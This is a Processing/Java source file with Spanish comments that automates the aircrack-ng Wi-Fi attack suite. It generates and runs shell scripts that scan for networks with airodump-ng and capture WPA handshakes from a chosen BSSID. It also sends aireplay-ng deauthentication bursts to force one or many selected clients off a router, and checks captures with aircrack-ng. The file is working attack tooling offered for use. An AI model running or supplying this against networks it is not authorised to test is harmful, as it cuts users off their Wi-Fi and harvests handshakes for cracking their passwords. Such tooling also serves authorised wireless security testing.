/*
FuncionesLinux.airePlay(RouterBSSID, ClienteMAC, AdaptadorRed) // (00:00:00... , 00:00:00... wlp7s0)                  Desautentica al usuario seleccionado
FuncionesLinux.airePlay(RouterBSSID, ClienteMAC, AdaptadorRed) // (00:00:00... , {00:00:00...,00:00:00...} wlp7s0)    Desautentica a los usuarios seleccionados

FuncionesLinux.airoDump(AdaptadorRed, Canal, BSSID) // (wlp7s0, 6, 00:00:00..)                                        Ejecuta AiroDump para capturar un handshake en un BSSID y canal especifico
FuncionesLinux.airoDump(AdaptadorRed) // (wlp7s0)                                                                     Ejecuta AiroDump para encontrar redes

FuncionesLinux.airCrack()                                                                                             Crea un archivo aircrack.log con la cantidad de handshakes capturados en el .cap de airodump

FuncionesLinux.iwconfig()                                                                                             Crea un archivo iwconfig.log con los adaptadores de red encontrados

*/

class FuncionesLinux{
boolean EstamosEnLinux = true; 
  void iwconfig(){
    String[] Lineas = {"iwconfig --version | grep \"Recommend\" > ./data/iwconfig.log"};
    saveStrings("data/ObtenerInterfaces.sh", Lineas);
    abrirEnLinux("data/ObtenerInterfaces.sh");
  }
  
  void aircrack(){
    String[] Lineas={"aircrack-ng ./data/psk-01.cap | grep \"1 handshake\" > ./data/aircrack.log"};
    saveStrings("data/AirCrack.sh", Lineas);
    abrirEnLinux("data/AirCrack.sh");
  }
  
  void airoDump(String AdaptadorRed, int Canal, String BSSID){
    String[] Lineas = {};
    for (int i = 1 ; i < 5; i++) {
    Lineas = append(Lineas, "kill $(ps -ax | grep xterm | grep -v \"grep\" | cut -d \" \" -f" + i + ")");
    }
    Lineas = append(Lineas, "rm -f ./data/psk-01.*");
    if (Modo5Ghz.Encendido){Lineas = append(Lineas, "xterm -e airodump-ng " + AdaptadorRed + " -c " + Canal + " --bssid " + BSSID + " --band a -w ./data/psk &");
    } else {Lineas = append(Lineas, "xterm -e airodump-ng " + AdaptadorRed + " -c " + Canal + " --bssid " + BSSID + " -w ./data/psk &");}
    saveStrings("data/AirodumpHandshake.sh", Lineas);
    thread("airoDumpHs");
  } 
  
  void airoDump(String AdaptadorRed){
    String[] Lineas={};
    for (int i = 1 ; i < 5; i++) {
    Lineas = append(Lineas, "kill $(ps -ax | grep xterm | grep -v \"grep\" | cut -d \" \" -f" + i + ")");
    }
    Lineas = append(Lineas, "rm -f ./data/DatosAiroDump-01.*");
    if (Modo5Ghz.Encendido){Lineas = append(Lineas, "xterm -e airodump-ng " + AdaptadorRed + " --write ./data/DatosAiroDump --update 1 --band a --output-format csv");
    } else {Lineas = append(Lineas, "xterm -e airodump-ng " + AdaptadorRed + " --write ./data/DatosAiroDump --update 1 --output-format csv");}
    saveStrings("data/Airodump.sh", Lineas);
    thread("airoDumpNo");
  } 

  
  void aireplay(String RouterBSSID, String ClienteMAC, String AdaptadorRed){
    String[] Lineas={};
    Lineas = append(Lineas, "xterm -e aireplay-ng -0 5 -a " + RouterBSSID + " -c " + ClienteMAC + " " + AdaptadorRed + "");
    saveStrings("data/Aireplay.sh", Lineas);
    thread("airePlayNo");
  }
  
  void aireplay(String RouterBSSID, String[] ClienteMAC, String AdaptadorRed){
    String[] Lineas={};
    for (int i = 0; i < ClienteMAC.length;i++){
    Lineas = append(Lineas, "xterm -e aireplay-ng -0 5 -a " + RouterBSSID + " -c " + ClienteMAC[i] + " " + AdaptadorRed + "");
    }
    saveStrings("data/Aireplay.sh", Lineas);
    thread("airePlayNo");
  }
  
  void cerrarAiroDump(){
   String[] Lineas={};
    for (int i = 1 ; i < 5; i++) {
      Lineas = append(Lineas, "kill $(ps -ax | grep xterm | grep -v \"grep\" | cut -d \" \" -f" + i + ") &>/dev/null");
    }
    saveStrings("data/CerrarAirodump.sh", Lineas);
    abrirEnLinux("data/CerrarAirodump.sh");
   } 
  
  void abrirEnLinux(String a){
    if (EstamosEnLinux){
      try {
        Runtime.getRuntime().exec("sh ./"+a, null, new File(sketchPath("")));
      }
      catch (Exception e) {
        println("No estamos en linux");
        EstamosEnLinux = false;
      }
    } else {
      println("AbrirEnLinux: " + a);
    }
  } 
}

void airoDumpNo(){
    FuncionesLinux.abrirEnLinux("data/Airodump.sh");
}
void airoDumpHs(){
    FuncionesLinux.abrirEnLinux("data/AirodumpHandshake.sh");
}
void airePlayNo(){
    FuncionesLinux.abrirEnLinux("data/Aireplay.sh");
}
